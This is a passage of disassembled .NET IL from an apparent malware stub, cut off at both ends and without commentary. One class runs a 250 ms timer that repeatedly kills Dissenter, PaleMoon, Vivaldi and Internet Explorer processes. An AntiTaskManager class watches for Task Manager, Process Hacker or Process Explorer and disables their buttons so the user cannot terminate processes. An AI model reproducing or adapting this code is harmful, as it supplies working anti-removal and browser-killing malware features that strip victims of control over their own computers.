    IL_023b:  ldstr      "Dissenter"
    IL_0240:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0245:  stloc.s    V_40
    IL_0247:  ldc.i4.0
    IL_0248:  stloc.s    V_41
    IL_024a:  br.s       IL_0271

    IL_024c:  ldloc.s    V_40
    IL_024e:  ldloc.s    V_41
    IL_0250:  ldelem.ref
    IL_0251:  stloc.s    V_9
    .try
    {
      IL_0253:  ldloc.s    V_9
      IL_0255:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
      IL_025a:  leave.s    IL_026b

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_025c:  dup
      IL_025d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0262:  stloc.s    V_42
      IL_0264:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0269:  leave.s    IL_026b

    }  // end handler
    IL_026b:  ldloc.s    V_41
    IL_026d:  ldc.i4.1
    IL_026e:  add.ovf
    IL_026f:  stloc.s    V_41
    IL_0271:  ldloc.s    V_41
    IL_0273:  ldloc.s    V_40
    IL_0275:  ldlen
    IL_0276:  conv.i4
    IL_0277:  blt.s      IL_024c

    IL_0279:  ldstr      "PaleMoon"
    IL_027e:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0283:  stloc.s    V_43
    IL_0285:  ldc.i4.0
    IL_0286:  stloc.s    V_44
    IL_0288:  br.s       IL_02af

    IL_028a:  ldloc.s    V_43
    IL_028c:  ldloc.s    V_44
    IL_028e:  ldelem.ref
    IL_028f:  stloc.s    V_10
    .try
    {
      IL_0291:  ldloc.s    V_10
      IL_0293:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
      IL_0298:  leave.s    IL_02a9

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_029a:  dup
      IL_029b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02a0:  stloc.s    V_45
      IL_02a2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_02a7:  leave.s    IL_02a9

    }  // end handler
    IL_02a9:  ldloc.s    V_44
    IL_02ab:  ldc.i4.1
    IL_02ac:  add.ovf
    IL_02ad:  stloc.s    V_44
    IL_02af:  ldloc.s    V_44
    IL_02b1:  ldloc.s    V_43
    IL_02b3:  ldlen
    IL_02b4:  conv.i4
    IL_02b5:  blt.s      IL_028a

    IL_02b7:  ldstr      "Vivaldi"
    IL_02bc:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_02c1:  stloc.s    V_46
    IL_02c3:  ldc.i4.0
    IL_02c4:  stloc.s    V_47
    IL_02c6:  br.s       IL_02ed

    IL_02c8:  ldloc.s    V_46
    IL_02ca:  ldloc.s    V_47
    IL_02cc:  ldelem.ref
    IL_02cd:  stloc.s    V_11
    .try
    {
      IL_02cf:  ldloc.s    V_11
      IL_02d1:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
      IL_02d6:  leave.s    IL_02e7

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_02d8:  dup
      IL_02d9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02de:  stloc.s    V_48
      IL_02e0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_02e5:  leave.s    IL_02e7

    }  // end handler
    IL_02e7:  ldloc.s    V_47
    IL_02e9:  ldc.i4.1
    IL_02ea:  add.ovf
    IL_02eb:  stloc.s    V_47
    IL_02ed:  ldloc.s    V_47
    IL_02ef:  ldloc.s    V_46
    IL_02f1:  ldlen
    IL_02f2:  conv.i4
    IL_02f3:  blt.s      IL_02c8

    IL_02f5:  ldstr      "iExplore"
    IL_02fa:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_02ff:  stloc.s    V_49
    IL_0301:  ldc.i4.0
    IL_0302:  stloc.s    V_50
    IL_0304:  br.s       IL_032b

    IL_0306:  ldloc.s    V_49
    IL_0308:  ldloc.s    V_50
    IL_030a:  ldelem.ref
    IL_030b:  stloc.s    V_12
    .try
    {
      IL_030d:  ldloc.s    V_12
      IL_030f:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
      IL_0314:  leave.s    IL_0325

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0316:  dup
      IL_0317:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_031c:  stloc.s    V_51
      IL_031e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0323:  leave.s    IL_0325

    }  // end handler
    IL_0325:  ldloc.s    V_50
    IL_0327:  ldc.i4.1
    IL_0328:  add.ovf
    IL_0329:  stloc.s    V_50
    IL_032b:  ldloc.s    V_50
    IL_032d:  ldloc.s    V_49
    IL_032f:  ldlen
    IL_0330:  conv.i4
    IL_0331:  blt.s      IL_0306

    IL_0333:  ret
  } // end of method xxma::Handler

  .method public static void  Start() cil managed
  {
    // Code size       53 (0x35)
    .maxstack  8
    IL_0000:  ldc.r8     250.
    IL_0009:  newobj     instance void [System]System.Timers.Timer::.ctor(float64)
    IL_000e:  stsfld     class [System]System.Timers.Timer Stub.xxma::xTimer
    IL_0013:  ldsfld     class [System]System.Timers.Timer Stub.xxma::xTimer
    IL_0018:  ldnull
    IL_0019:  ldftn      void Stub.xxma::Handler(object,
                                                 class [System]System.Timers.ElapsedEventArgs)
    IL_001f:  newobj     instance void [System]System.Timers.ElapsedEventHandler::.ctor(object,
                                                                                        native int)
    IL_0024:  callvirt   instance void [System]System.Timers.Timer::add_Elapsed(class [System]System.Timers.ElapsedEventHandler)
    IL_0029:  ldsfld     class [System]System.Timers.Timer Stub.xxma::xTimer
    IL_002e:  ldc.i4.1
    IL_002f:  callvirt   instance void [System]System.Timers.Timer::set_Enabled(bool)
    IL_0034:  ret
  } // end of method xxma::Start

} // end of class Stub.xxma

.class public auto ansi AntiTaskManager
       extends [mscorlib]System.Object
{
  .class auto ansi sealed nested private EnumWindProc
         extends [mscorlib]System.MulticastDelegate
  {
    .method public specialname rtspecialname 
            instance void  .ctor(object TargetObject,
                                 native int TargetMethod) runtime managed
    {
    } // end of method EnumWindProc::.ctor

    .method public newslot strict virtual 
            instance class [mscorlib]System.IAsyncResult 
            BeginInvoke(int32 hWnd,
                        int32 lParam,
                        class [mscorlib]System.AsyncCallback DelegateCallback,
                        object DelegateAsyncState) runtime managed
    {
    } // end of method EnumWindProc::BeginInvoke

    .method public newslot strict virtual 
            instance bool  EndInvoke(class [mscorlib]System.IAsyncResult DelegateAsyncResult) runtime managed
    {
    } // end of method EnumWindProc::EndInvoke

    .method public newslot strict virtual 
            instance bool  Invoke(int32 hWnd,
                                  int32 lParam) runtime managed
    {
    } // end of method EnumWindProc::Invoke

  } // end of class EnumWindProc

  .class auto ansi sealed nested private EnumChildWindProc
         extends [mscorlib]System.MulticastDelegate
  {
    .method public specialname rtspecialname 
            instance void  .ctor(object TargetObject,
                                 native int TargetMethod) runtime managed
    {
    } // end of method EnumChildWindProc::.ctor

    .method public newslot strict virtual 
            instance class [mscorlib]System.IAsyncResult 
            BeginInvoke(int32 hWnd,
                        int32 lParam,
                        class [mscorlib]System.AsyncCallback DelegateCallback,
                        object DelegateAsyncState) runtime managed
    {
    } // end of method EnumChildWindProc::BeginInvoke

    .method public newslot strict virtual 
            instance bool  EndInvoke(class [mscorlib]System.IAsyncResult DelegateAsyncResult) runtime managed
    {
    } // end of method EnumChildWindProc::EndInvoke

    .method public newslot strict virtual 
            instance bool  Invoke(int32 hWnd,
                                  int32 lParam) runtime managed
    {
    } // end of method EnumChildWindProc::Invoke

  } // end of class EnumChildWindProc

  .field private class [mscorlib]System.Collections.Generic.List`1<native int> CLD
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       18 (0x12)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  newobj     instance void class [mscorlib]System.Collections.Generic.List`1<native int>::.ctor()
    IL_000c:  stfld      class [mscorlib]System.Collections.Generic.List`1<native int> AntiTaskManager::CLD
    IL_0011:  ret
  } // end of method AntiTaskManager::.ctor

  .method private static pinvokeimpl("user32.dll" winapi) 
          bool  EnableWindow(native int hWnd,
                             bool bEnable) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" nomangle ansi lasterr winapi) 
          int32  GetWindowThreadProcessId(native int hwnd,
                                          int32& lpdwProcessID) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" nomangle ansi lasterr winapi) 
          native int  GetForegroundWindow() cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32" as "GetClassNameA" nomangle ansi lasterr winapi) 
          int32  GetClassName(int32 hwnd,
                              string&  marshal( byvalstr) lpClassName,
                              int32 nMaxCount) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32" as "SendMessageA" nomangle ansi lasterr winapi) 
          int32  SendMessage(int32 hwnd,
                             int32 wMsg,
                             int32 wParam,
                             string&  marshal( byvalstr) lParam) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" autochar lasterr winapi) 
          int32  GetWindowText(int32 hwnd,
                               class [mscorlib]System.Text.StringBuilder lpString,
                               int32 cch) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" autochar lasterr winapi) 
          int32  GetWindowTextLength(int32 hwnd) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          int32  EnumChildWindows(native int hWnd,
                                  class AntiTaskManager/EnumWindProc lpEnumFunc,
                                  native int& lParam) cil managed preservesig
  {
  }
  .method private instance bool  EnumChild(int32 hWnd,
                                           int32 lParam) cil managed
  {
    // Code size       19 (0x13)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      class [mscorlib]System.Collections.Generic.List`1<native int> AntiTaskManager::CLD
    IL_0006:  ldarg.1
    IL_0007:  call       native int [mscorlib]System.IntPtr::op_Explicit(int32)
    IL_000c:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<native int>::Add(!0)
    IL_0011:  ldc.i4.1
    IL_0012:  ret
  } // end of method AntiTaskManager::EnumChild

  .method public instance void  protect() cil managed
  {
    // Code size       882 (0x372)
    .maxstack  7
    .locals init (int32 V_0,
             int32 V_1,
             int32 V_2,
             object V_3,
             int32 V_4,
             native int V_5,
             string V_6,
             int32 V_7,
             class [System]System.Diagnostics.Process V_8,
             class [mscorlib]System.Text.StringBuilder V_9,
             object V_10,
             class [mscorlib]System.Collections.Generic.List`1<native int> V_11,
             int32 V_12,
             native int[] V_13,
             int32 V_14,
             native int V_15,
             string V_16,
             int32 V_17)
    .try
    {
      IL_0000:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0005:  ldc.i4.1
      IL_0006:  stloc.0
      IL_0007:  br         IL_0278

      IL_000c:  ldc.i4.4
      IL_000d:  stloc.2
      IL_000e:  ldc.i4.s   100
      IL_0010:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_0015:  ldc.i4.5
      IL_0016:  stloc.2
      IL_0017:  call       native int AntiTaskManager::GetForegroundWindow()
      IL_001c:  box        [mscorlib]System.IntPtr
      IL_0021:  stloc.3
      IL_0022:  ldc.i4.6
      IL_0023:  stloc.2
      IL_0024:  ldloc.3
      IL_0025:  ldnull
      IL_0026:  ldstr      "ToInt32"
      IL_002b:  ldc.i4.0
      IL_002c:  newarr     [mscorlib]System.Object
      IL_0031:  ldnull
      IL_0032:  ldnull
      IL_0033:  ldnull
      IL_0034:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_0039:  ldc.i4.0
      IL_003a:  box        [mscorlib]System.Int32
      IL_003f:  ldc.i4.0
      IL_0040:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectEqual(object,
                                                                                                                                       object,
                                                                                                                                       bool)
      IL_0045:  brtrue     IL_0278

      IL_004a:  ldc.i4.8
      IL_004b:  stloc.2
      IL_004c:  ldc.i4.0
      IL_004d:  stloc.s    V_4
      IL_004f:  ldc.i4.s   9
      IL_0051:  stloc.2
      IL_0052:  ldloc.3
      IL_0053:  dup
      IL_0054:  brtrue.s   IL_0063

      IL_0056:  pop
      IL_0057:  ldloca.s   V_5
      IL_0059:  initobj    [mscorlib]System.IntPtr
      IL_005f:  ldloc.s    V_5
      IL_0061:  br.s       IL_0068

      IL_0063:  unbox.any  [mscorlib]System.IntPtr
      IL_0068:  ldloca.s   V_4
      IL_006a:  call       int32 AntiTaskManager::GetWindowThreadProcessId(native int,
                                                                           int32&)
      IL_006f:  pop
      IL_0070:  ldc.i4.s   10
      IL_0072:  stloc.2
      IL_0073:  ldloc.s    V_4
      IL_0075:  ldc.i4.0
      IL_0076:  ble        IL_0278

      IL_007b:  ldc.i4.s   11
      IL_007d:  stloc.2
      IL_007e:  ldstr      ""
      IL_0083:  stloc.s    V_6
      IL_0085:  ldc.i4.s   12
      IL_0087:  stloc.2
      IL_0088:  ldloc.3
      IL_0089:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(object)
      IL_008e:  call       int32 AntiTaskManager::GetWindowTextLength(int32)
      IL_0093:  stloc.s    V_7
      IL_0095:  ldc.i4.s   13
      IL_0097:  stloc.2
      IL_0098:  ldloc.s    V_7
      IL_009a:  brtrue.s   IL_00a8

      IL_009c:  ldc.i4.s   14
      IL_009e:  stloc.2
      IL_009f:  ldstr      ""
      IL_00a4:  stloc.s    V_6
      IL_00a6:  br.s       IL_00ff

      IL_00a8:  ldc.i4.s   16
      IL_00aa:  stloc.2
      IL_00ab:  ldloc.s    V_7
      IL_00ad:  ldc.i4.1
      IL_00ae:  add.ovf
      IL_00af:  newobj     instance void [mscorlib]System.Text.StringBuilder::.ctor(int32)
      IL_00b4:  stloc.s    V_9
      IL_00b6:  ldc.i4.s   17
      IL_00b8:  stloc.2
      IL_00b9:  ldloc.3
      IL_00ba:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(object)
      IL_00bf:  ldloc.s    V_9
      IL_00c1:  ldloc.s    V_9
      IL_00c3:  callvirt   instance int32 [mscorlib]System.Text.StringBuilder::get_Capacity()
      IL_00c8:  call       int32 AntiTaskManager::GetWindowText(int32,
                                                                class [mscorlib]System.Text.StringBuilder,
                                                                int32)
      IL_00cd:  box        [mscorlib]System.Int32
      IL_00d2:  stloc.s    V_10
      IL_00d4:  ldc.i4.s   18
      IL_00d6:  stloc.2
      IL_00d7:  ldloc.s    V_10
      IL_00d9:  ldc.i4.0
      IL_00da:  box        [mscorlib]System.Int32
      IL_00df:  ldc.i4.0
      IL_00e0:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectEqual(object,
                                                                                                                                       object,
                                                                                                                                       bool)
      IL_00e5:  brfalse.s  IL_00f3

      IL_00e7:  ldc.i4.s   19
      IL_00e9:  stloc.2
      IL_00ea:  ldstr      ""
      IL_00ef:  stloc.s    V_6
      IL_00f1:  br.s       IL_00ff

      IL_00f3:  ldc.i4.s   21
      IL_00f5:  stloc.2
      IL_00f6:  ldloc.s    V_9
      IL_00f8:  callvirt   instance string [mscorlib]System.Text.StringBuilder::ToString()
      IL_00fd:  stloc.s    V_6
      IL_00ff:  ldc.i4.s   22
      IL_0101:  stloc.2
      IL_0102:  ldloc.s    V_4
      IL_0104:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetProcessById(int32)
      IL_0109:  stloc.s    V_8
      IL_010b:  ldc.i4.s   23
      IL_010d:  stloc.2
      IL_010e:  ldloc.s    V_8
      IL_0110:  callvirt   instance string [System]System.Diagnostics.Process::get_ProcessName()
      IL_0115:  callvirt   instance string [mscorlib]System.String::ToLower()
      IL_011a:  ldstr      "taskmgr"
      IL_011f:  ldc.i4.0
      IL_0120:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0125:  ldc.i4.0
      IL_0126:  ceq
      IL_0128:  ldloc.s    V_8
      IL_012a:  callvirt   instance string [System]System.Diagnostics.Process::get_ProcessName()
      IL_012f:  callvirt   instance string [mscorlib]System.String::ToLower()
      IL_0134:  ldstr      "processhacker"
      IL_0139:  ldc.i4.0
      IL_013a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_013f:  ldc.i4.0
      IL_0140:  ceq
      IL_0142:  or
      IL_0143:  ldloc.s    V_6
      IL_0145:  callvirt   instance string [mscorlib]System.String::ToLower()
      IL_014a:  ldstr      "process explorer"
      IL_014f:  ldc.i4.0
      IL_0150:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0155:  ldc.i4.0
      IL_0156:  ceq
      IL_0158:  or
      IL_0159:  brfalse    IL_0278

      IL_015e:  ldc.i4.s   24
      IL_0160:  stloc.2
      IL_0161:  newobj     instance void class [mscorlib]System.Collections.Generic.List`1<native int>::.ctor()
      IL_0166:  stloc.s    V_11
      IL_0168:  ldc.i4.s   25
      IL_016a:  stloc.2
      IL_016b:  ldc.i4.0
      IL_016c:  stloc.s    V_12
      IL_016e:  ldc.i4.s   26
      IL_0170:  stloc.2
      IL_0171:  ldarg.0
      IL_0172:  ldloc.3
      IL_0173:  dup
      IL_0174:  brtrue.s   IL_0183

      IL_0176:  pop
      IL_0177:  ldloca.s   V_5
      IL_0179:  initobj    [mscorlib]System.IntPtr
      IL_017f:  ldloc.s    V_5
      IL_0181:  br.s       IL_0188

      IL_0183:  unbox.any  [mscorlib]System.IntPtr
      IL_0188:  call       instance native int[] AntiTaskManager::GetChild(native int)
      IL_018d:  stloc.s    V_13
      IL_018f:  ldc.i4.0
      IL_0190:  stloc.s    V_14
      IL_0192:  br         IL_0240

      IL_0197:  ldloc.s    V_13
      IL_0199:  ldloc.s    V_14
      IL_019b:  ldelem.i
      IL_019c:  stloc.s    V_15
      IL_019e:  ldc.i4.s   27
      IL_01a0:  stloc.2
      IL_01a1:  ldc.i4     0xc8
      IL_01a6:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Space(int32)
      IL_01ab:  stloc.s    V_16
      IL_01ad:  ldc.i4.s   28
      IL_01af:  stloc.2
      IL_01b0:  ldloc.s    V_15
      IL_01b2:  call       int32 [mscorlib]System.IntPtr::op_Explicit(native int)
      IL_01b7:  ldloca.s   V_16
      IL_01b9:  ldc.i4     0xc8
      IL_01be:  call       int32 AntiTaskManager::GetClassName(int32,
                                                               string&,
                                                               int32)
      IL_01c3:  stloc.s    V_17
      IL_01c5:  ldc.i4.s   29
      IL_01c7:  stloc.2
      IL_01c8:  ldloc.s    V_16
      IL_01ca:  ldloc.s    V_17
      IL_01cc:  ldc.i4     0xc8
      IL_01d1:  ldloc.s    V_17
      IL_01d3:  sub.ovf
      IL_01d4:  callvirt   instance string [mscorlib]System.String::Remove(int32,
                                                                           int32)
      IL_01d9:  stloc.s    V_16
      IL_01db:  ldc.i4.s   30
      IL_01dd:  stloc.2
      IL_01de:  ldloc.s    V_16
      IL_01e0:  callvirt   instance string [mscorlib]System.String::ToLower()
      IL_01e5:  ldstr      "button"
      IL_01ea:  ldc.i4.0
      IL_01eb:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_01f0:  brtrue.s   IL_01fe

      IL_01f2:  ldc.i4.s   31
      IL_01f4:  stloc.2
      IL_01f5:  ldloc.s    V_11
      IL_01f7:  ldloc.s    V_15
      IL_01f9:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<native int>::Add(!0)
      IL_01fe:  ldc.i4.s   32
      IL_0200:  stloc.2
      IL_0201:  ldloc.s    V_16
      IL_0203:  callvirt   instance string [mscorlib]System.String::ToLower()
      IL_0208:  ldstr      "static"
      IL_020d:  ldc.i4.0
      IL_020e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0213:  ldc.i4.0
      IL_0214:  ceq
      IL_0216:  ldloc.s    V_16
      IL_0218:  callvirt   instance string [mscorlib]System.String::ToLower()
      IL_021d:  ldstr      "directuihwnd"
      IL_0222:  ldc.i4.0
      IL_0223:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0228:  ldc.i4.0
      IL_0229:  ceq
      IL_022b:  or
      IL_022c:  brfalse.s  IL_0237

      IL_022e:  ldc.i4.s   33
      IL_0230:  stloc.2
      IL_0231:  ldloc.s    V_12
      IL_0233:  ldc.i4.1
      IL_0234:  add.ovf
      IL_0235:  stloc.s    V_12
      IL_0237:  ldc.i4.s   34
      IL_0239:  stloc.2
      IL_023a:  ldloc.s    V_14
      IL_023c:  ldc.i4.1
      IL_023d:  add.ovf
      IL_023e:  stloc.s    V_14
      IL_0240:  ldloc.s    V_14
      IL_0242:  ldloc.s    V_13
      IL_0244:  ldlen
      IL_0245:  conv.i4
      IL_0246:  blt        IL_0197

      IL_024b:  ldc.i4.s   35
      IL_024d:  stloc.2
      IL_024e:  ldloc.s    V_11
      IL_0250:  callvirt   instance int32 class [mscorlib]System.Collections.Generic.List`1<native int>::get_Count()
      IL_0255:  ldc.i4.2
      IL_0256:  ceq
      IL_0258:  ldloc.s    V_12
      IL_025a:  ldc.i4.2
      IL_025b:  ceq
      IL_025d:  ldloc.s    V_12
      IL_025f:  ldc.i4.1
      IL_0260:  ceq
      IL_0262:  or
      IL_0263:  and
      IL_0264:  brfalse.s  IL_0278

      IL_0266:  ldc.i4.s   36
      IL_0268:  stloc.2
      IL_0269:  ldloc.s    V_11
      IL_026b:  ldc.i4.0
      IL_026c:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.List`1<native int>::get_Item(int32)
      IL_0271:  ldc.i4.0
      IL_0272:  call       bool AntiTaskManager::EnableWindow(native int,
                                                              bool)
      IL_0277:  pop
      IL_0278:  ldc.i4.3
      IL_0279:  stloc.2
      IL_027a:  br         IL_000c

      IL_027f:  leave      IL_0369

      IL_0284:  ldloc.1
      IL_0285:  ldc.i4.1
      IL_0286:  add
      IL_0287:  ldc.i4.0
      IL_0288:  stloc.1
      IL_0289:  switch     ( 
                            IL_032a,
                            IL_0000,
                            IL_0278,
                            IL_0278,
                            IL_000c,
                            IL_0015,
                            IL_0022,
                            IL_0278,
                            IL_004a,
                            IL_004f,
                            IL_0070,
                            IL_007b,
                            IL_0085,
                            IL_0095,
                            IL_009c,
                            IL_00ff,
                            IL_00a8,
                            IL_00b6,
                            IL_00d4,
                            IL_00e7,
                            IL_00ff,
                            IL_00f3,
                            IL_00ff,
                            IL_010b,
                            IL_015e,
                            IL_0168,
                            IL_016e,
                            IL_019e,
                            IL_01ad,
                            IL_01c5,
                            IL_01db,
                            IL_01f2,
                            IL_01fe,
                            IL_022e,
                            IL_0237,
                            IL_024b,
                            IL_0266,
                            IL_0278,
                            IL_027f)
      IL_032a:  leave.s    IL_035e

      IL_032c:  ldloc.2
      IL_032d:  stloc.1
      IL_032e:  ldloc.0
      IL_032f:  switch     ( 
                            IL_033c,
                            IL_0284)
      IL_033c:  leave.s    IL_035e

    }  // end .try
    filter
    {
      IL_033e:  isinst     [mscorlib]System.Exception
      IL_0343:  ldnull
      IL_0344:  cgt.un
      IL_0346:  ldloc.0
      IL_0347:  ldc.i4.0
      IL_0348:  cgt.un
      IL_034a:  and
      IL_034b:  ldloc.1
      IL_034c:  ldc.i4.0
      IL_034d:  ceq
      IL_034f:  and
      IL_0350:  endfilter
    }  // end filter
    {  // handler
      IL_0352:  castclass  [mscorlib]System.Exception
      IL_0357:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_035c:  leave.s    IL_032c

    }  // end handler
    IL_035e:  ldc.i4     0x800a0033
    IL_0363:  call       class [mscorlib]System.Exception [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::CreateProjectError(int32)
    IL_0368:  throw

    IL_0369:  ldloc.1
    IL_036a:  brfalse.s  IL_0371

    IL_036c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
    IL_0371:  ret
  } // end of method AntiTaskManager::protect

  .method private instance native int[]  GetChild(native int hwd) cil managed
  {
    // Code size       182 (0xb6)
    .maxstack  3
    .locals init (native int[] V_0,
             int32 V_1,
             int32 V_2,
             int32 V_3,
             object V_4,
             native int V_5)
    .try
    {
      IL_0000:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0005:  ldc.i4.1
      IL_0006:  stloc.1
      IL_0007:  ldc.i4.2
      IL_0008:  stloc.3
      IL_0009:  ldarg.0
      IL_000a:  stloc.s    V_4
      IL_000c:  ldloc.s    V_4
      IL_000e:  call       void [mscorlib]System.Threading.Monitor::Enter(object)
      .try
      {
        IL_0013:  ldarg.0
        IL_0014:  ldfld      class [mscorlib]System.Collections.Generic.List`1<native int> AntiTaskManager::CLD
        IL_0019:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<native int>::Clear()
        IL_001e:  ldarg.1
        IL_001f:  ldarg.0
        IL_0020:  ldftn      instance bool AntiTaskManager::EnumChild(int32,
                                                                      int32)
        IL_0026:  newobj     instance void AntiTaskManager/EnumWindProc::.ctor(object,
                                                                               native int)
        IL_002b:  ldc.i4.0
        IL_002c:  call       native int [mscorlib]System.IntPtr::op_Explicit(int32)
        IL_0031:  stloc.s    V_5
        IL_0033:  ldloca.s   V_5
        IL_0035:  call       int32 AntiTaskManager::EnumChildWindows(native int,
                                                                     class AntiTaskManager/EnumWindProc,
                                                                     native int&)
        IL_003a:  pop
        IL_003b:  ldarg.0
        IL_003c:  ldfld      class [mscorlib]System.Collections.Generic.List`1<native int> AntiTaskManager::CLD
        IL_0041:  callvirt   instance !0[] class [mscorlib]System.Collections.Generic.List`1<native int>::ToArray()
        IL_0046:  stloc.0
        IL_0047:  leave.s    IL_0051

      }  // end .try
      finally
      {
        IL_0049:  ldloc.s    V_4
        IL_004b:  call       void [mscorlib]System.Threading.Monitor::Exit(object)
        IL_0050:  endfinally
      }  // end handler
      IL_0051:  leave.s    IL_00ac

      IL_0053:  ldloc.2
      IL_0054:  ldc.i4.1
      IL_0055:  add
      IL_0056:  ldc.i4.0
      IL_0057:  stloc.2
      IL_0058:  switch     ( 
                            IL_006d,
                            IL_0000,
                            IL_0007,
                            IL_0051)
      IL_006d:  leave.s    IL_00a1

      IL_006f:  ldloc.3
      IL_0070:  stloc.2
      IL_0071:  ldloc.1
      IL_0072:  switch     ( 
                            IL_007f,
                            IL_0053)
      IL_007f:  leave.s    IL_00a1

    }  // end .try
    filter
    {
      IL_0081:  isinst     [mscorlib]System.Exception
      IL_0086:  ldnull
      IL_0087:  cgt.un
      IL_0089:  ldloc.1
      IL_008a:  ldc.i4.0
      IL_008b:  cgt.un
      IL_008d:  and
      IL_008e:  ldloc.2
      IL_008f:  ldc.i4.0
      IL_0090:  ceq
      IL_0092:  and
      IL_0093:  endfilter
    }  // end filter
    {  // handler
      IL_0095:  castclass  [mscorlib]System.Exception
      IL_009a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_009f:  leave.s    IL_006f

    }  // end handler
    IL_00a1:  ldc.i4     0x800a0033
    IL_00a6:  call       class [mscorlib]System.Exception [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::CreateProjectError(int32)
    IL_00ab:  throw

    IL_00ac:  ldloc.2
    IL_00ad:  brfalse.s  IL_00b4

    IL_00af:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
    IL_00b4:  ldloc.0
    IL_00b5:  ret
  } // end of method AntiTaskManager::GetChild

} // end of class AntiTaskManager

.class private auto ansi sealed beforefieldinit j.OK
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .class auto ansi sealed nested private SW
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname int32 value__
    .field public static literal valuetype j.OK/SW Hide = int32(0x00000000)
    .field public static literal valuetype j.OK/SW Normal = int32(0x00000001)
